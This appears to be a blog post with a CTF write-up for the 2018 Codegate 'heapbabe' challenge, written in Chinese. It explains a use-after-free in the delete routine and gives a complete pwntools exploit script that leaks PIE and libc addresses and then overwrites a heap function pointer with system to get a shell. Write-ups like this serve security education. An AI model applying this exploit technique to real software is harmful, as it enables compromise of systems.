---
layout: post
title: "2018 codegate heapbabe"
description: "uafpwn"
categories: [2018/05]
tags: [ctf,pwn]
redirect_from:
  - /2018/05/19/
---

* heapbabe

> IDA反编译看一下，发现在delete函数中判断该buffer是否存在是判断table中该buffer的地址是否存在，而删除过程中并没有把该地址置0，所以有uaf漏洞，并且会调用存放在堆中的函数地址，那么只要修改该地址就可以劫持rip

&emsp;&emsp;&emsp;![2017-nullcon-level1](https://raw.githubusercontent.com/lm0963/lm0963.github.io/master/assets/images/screenshots/pwn/2018-codegate-heapbabe-1.png)

利用：

> 1.分配两个足够大的buffer，然后释放掉，这时候table里面会留有两个堆地址（堆块0，堆块1）  
> 2.分配一个足够大的buffer，覆盖堆块1里面的函数地址的低字节为\xaa，之所以要足够大是为了使快表中的空闲地址与其他地址合并（堆块2）  
> 3.delete堆块1，获得函数地址，绕过pie  
> 4.delete堆块2，重复第二步，覆盖地址为printf的地址，通过%12$lx泄露出libc的地址  
> 5.delete堆块2，重复第二步，覆盖地址为system的地址，并且前面存放/bin/sh;  
> 6.最后delete堆块1，获得shell  

```
from pwn import *
io=process('heapbabe')
#gdb.attach(io)
#context.log_level='debug'

def alloc(size,data):
    io.sendlineafter('>>','A')
    io.sendlineafter('size',str(size))
    io.sendafter('contents',data)

def free(idx):
    io.sendlineafter('>>','F')
    io.sendlineafter('id',str(idx))
    io.sendlineafter('DELETE','DELETE')

alloc(0x400,'0'*0x400)
alloc(0x400,'1'*0x400)
#alloc(0x90,'2'*0x90)
free(1)
free(0)
payload='\xaa\0'.rjust(0x42a,'0')
alloc(len(payload),payload)
free(1)
io.recvuntil('\xaa')
addr=u64(('\xaa'+io.recvline()[:-1]).ljust(8,'\0'))-0xcaa
free(0)
payload='0'.ljust(0x420-3,'0')+'0x%12$lxend'+(p64(addr+0xd85)+'\0')#.rjust(0x431,'0')
alloc(len(payload),payload)
free(1)
io.recvuntil('0x')
libc=int(io.recvuntil('end')[:-3],16)-0x3C3483
system=libc+0x46590
io.sendline('A')
io.sendline('A')
free(0)
payload='0'.ljust(0x428-0x18,'0')+'/bin/sh;'+'a'*0x10+(p64(system)+'\0')
alloc(len(payload),payload)
free(1)
print hex(libc)
print hex(system)
print hex(addr)
io.interactive()
```